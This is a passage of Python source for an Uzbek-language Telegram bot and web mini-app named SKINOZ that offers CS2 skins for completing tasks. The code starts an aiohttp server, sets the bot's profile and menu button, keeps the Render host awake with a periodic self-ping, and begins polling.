    print("🚀 SKENUZ CS2 BOT & MINI APP SERVER ISHGA TUSHMOQDA...")
    print(f"🤖 Bot Token: {BOT_TOKEN[:15]}...")
    print(f"🌐 Server Port: {PORT}")
    print("=" * 60)

    # 1. Aiohttp Web Server
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"✅ Mini App Web Server faol: http://localhost:{PORT}")

    # 2. Telegram Bot Polling & Menu Button & Bot Info
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await bot.set_my_name("SKINOZ")
    except Exception as e:
        logging.warning(f"set_my_name: {e}")
    try:
        await bot.set_my_description(
            "Oddiy vazifalarni bajarib, haqiqiy skinlarni qo'lga kiriting.\n\n"
            "Botni ishga tushirish uchun /start tugmasini bosing."
        )
    except Exception as e:
        logging.warning(f"set_my_description: {e}")
    try:
        await bot.set_my_short_description("🌟 Skinozga xush kelibsiz. CS2 skinlarini yutib oling.")
    except Exception as e:
        logging.warning(f"set_my_short_description: {e}")
    try:
        avatar_path = os.path.join(WEBAPP_DIR, "images", "avatar.jpg")
        if os.path.exists(avatar_path):
            from aiogram.types import InputProfilePhotoStatic, FSInputFile
            await bot.set_my_profile_photo(photo=InputProfilePhotoStatic(photo=FSInputFile(avatar_path)))
            print("✅ Bot profili rasmi o'rnatildi!")
    except Exception as e:
        logging.warning(f"set_my_profile_photo: {e}")
    try:
        await bot.set_chat_menu_button(
            menu_button=MenuButtonWebApp(
                text="🎮 Open SKINOZ",
                web_app=WebAppInfo(url=f"{WEB_APP_URL}/")
            )
        )
    except Exception as e:
        logging.warning(f"Menu button xatosi: {e}")

    async def keep_alive_ping():
        import aiohttp
        while True:
            await asyncio.sleep(480) # har 8 daqiqada Render uxlamasligi uchun ping
            try:
                if WEB_APP_URL and "onrender.com" in WEB_APP_URL:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f"{WEB_APP_URL}/") as resp:
                            pass
            except Exception:
                pass

    asyncio.create_task(keep_alive_ping())
    print("✅ Telegram Bot polling boshlandi (@Skenuzbot)!")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query", "chat_member", "my_chat_member"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("Bot to'xtatildi.")
